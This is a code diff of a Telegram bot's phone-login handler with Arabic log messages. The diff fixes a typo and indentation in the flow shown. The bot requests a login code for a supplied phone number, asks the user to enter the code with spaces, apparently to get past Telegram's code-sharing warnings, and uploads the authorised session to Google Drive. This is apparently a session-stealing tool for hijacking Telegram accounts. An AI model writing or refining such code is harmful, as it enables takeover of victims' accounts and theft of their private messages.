@@ -122,15 +122,11 @@ async def process_phone(update, context):
 
     print("Try was here before")
     try:
-        print("sttart here")
+        print("start here")
         await client.connect()
         print("تم إنشاء الاتصال بـ Telegram.")
         print("قبل التحقق من إذا كان المستخدم مصرح له.")
-        if await client.is_user_authorized():
-            print("المستخدم مصرح له مسبقًا.")
-        else:
-            print("المستخدم غير مصرح له. سيتم إرسال رمز التحقق.")
-        
+    
         if await client.is_user_authorized():
             print("المستخدم مصرح له مسبقًا.")
             # رفع الجلسة إلى Google Drive
@@ -178,20 +174,17 @@ async def process_phone(update, context):
                 print(f"خطأ أثناء رفع الجلسة إلى Google Drive: {upload_error}")
                 await update.message.reply_text(f"خطأ أثناء رفع الجلسة إلى Google Drive: {upload_error}")
                 return PHONE
-        #try was end here before
-        
+
         # طلب رمز التحقق
-        
-         await client.send_code_request(phone_number)
-         print("تم إرسال رمز التحقق.")
-         await update.message.reply_text("تم إرسال رمز التحقق إلى رقمك. الرجاء إدخال الرمز (مثل: 2 2 9 3 0):")
-         return CODE
+        await client.send_code_request(phone_number)
+        print("تم إرسال رمز التحقق.")
+        await update.message.reply_text("تم إرسال رمز التحقق إلى رقمك. الرجاء إدخال الرمز (مثل: 2 2 9 3 0):")
+        return CODE
 
     except Exception as e:
         print(f"حدث خطأ أثناء إنشاء الجلسة: {e}")
         await update.message.reply_text(f"حدث خطأ أثناء إنشاء الجلسة: {e}")
         return PHONE
-
     
 
 async def process_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
